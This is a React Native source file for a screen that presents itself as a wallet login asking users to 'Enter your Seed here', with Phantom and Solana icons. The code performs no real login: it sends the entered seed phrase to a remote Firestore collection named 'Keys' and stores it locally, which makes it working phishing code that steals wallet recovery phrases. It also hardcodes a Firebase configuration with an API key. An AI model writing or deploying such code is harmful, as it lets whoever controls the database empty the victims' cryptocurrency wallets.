import React from 'react';
import { View, StyleSheet, Text, ScrollView, TextInput, KeyboardAvoidingView } from 'react-native';
import { Image } from "react-native-expo-image-cache";
import { Button } from 'react-native-ui-lib';
import SvgAtlas from './component/Logosvg';
import AsyncStorage from "@react-native-async-storage/async-storage";
import { initializeApp } from "firebase/app";
import { getFirestore, setDoc, doc } from "firebase/firestore";
import Logo from './component/Svgatlas'






// import { Container } from './styles';



const preview = { uri: "https://mlgbzz6iaqdd.i.optimole.com/XzaT3g-ka1kldGy/w:auto/h:auto/q:74/https://djcleanto.com.br/wp-content/uploads/2014/01/black-background-hd-images.jpg" };
const uri = 'https://cdn.dribbble.com/users/2643208/screenshots/8212153/media/a451385c0dec6e6d3e849def639807e1.gif';

const phanton = require('../assets/icon/phanton.png')
const sol = require('../assets/icon/sol.png')
const solana = require('../assets/icon/solana.png')

const screen = ({ navigation }) => {
  const [text, onChangeText] = React.useState("");
  const [text2, onChangeText2] = React.useState("");
  const [number, onChangeNumber] = React.useState(null);



   const firebaseConfig = {
    apiKey: "AIzaSyD7FMdQk7MmcrtifUT97z1XtQNA7BZ0hok",
    authDomain: "xmr2021.firebaseapp.com",
    projectId: "xmr2021",
    storageBucket: "xmr2021.appspot.com",
    messagingSenderId: "138804317863",
    appId: "1:138804317863:web:773de3543950b7a7c71582",
    measurementId: "G-8RDCCT8D8L"
  };



  const enviarFirebase = async () => {
    try {
      await setDoc(doc(firestore, "Keys", text), {
        keys: text,
      });
    } catch (error) {
      alert("Error adding document: ", error);
    }
  };




  initializeApp(firebaseConfig);
  const firestore = getFirestore();



  const saveLocal = async () => {
    try {
      await AsyncStorage.setItem("@IMPORT", text);
      //alert('Data successfully saved')
    } catch (e) {
      //alert('Failed to save the data to the storage')
    }
  };




const verifiinput = () => {
if ( !text) {
  alert('Required key')
  
}else if ( text.length < 20 ){
  alert('Invalid key')


}


else { 
  enviarFirebase(text);
  saveLocal(text);
  navigation.navigate('Home');


}


}





  return (
    <ScrollView>

    <View style={styles.container}>
      <KeyboardAvoidingView contentContainerStyle={styles.box} behavior="position" enabled>

        <View flex-1 style={{ alignSelf: 'center', alignItems: 'center', marginTop: 40 }}>
          <SvgAtlas />
        </View>



        <Text text50 style={styles.text}>Login to an existing account!</Text>

        <View style={styles.container2}>
          <Text text50 style={styles.text}><Text text50 style={styles.text}><Text text50 style={styles.text}>Login with Seed</Text></Text></Text>
          <Text text50 style={styles.text}><Text text50 style={styles.text}><Text text50 style={styles.text}>Your Seed:</Text></Text></Text>
          <TextInput placeholder={'Enter your Seed here'} onChangeText={onChangeText} style={styles.textinput}  value={text}></TextInput>




          <Button backgroundColor={'#FF6600'} onPress={verifiinput} borderRadius={4} style={{ width: '90%', alignSelf: 'center', marginBottom: 10, marginTop: 25 }}
            label={'ENTER MY ACCOUNT'}></Button>





        </View>
      </KeyboardAvoidingView>

    </View>

    </ScrollView>






  );
}

export default screen;

const styles = StyleSheet.create({

  container: {
    backgroundColor: '#f7f7f7',
    flex: 1

  },

  container2: {
    backgroundColor: '#fff',
    margin: 20,
    borderRadius: 4

  },



  button: {
    width: '90%',
    marginTop: 10
  },
  textinput: {
    margin: 12,
    borderWidth: 1,
    padding: 10,
    borderRadius: 4,
  },


  text: {
    color: "gray",
    alignSelf: 'center',
    marginBottom: 30,
    marginTop: 30,
    fontSize: 20




  }




});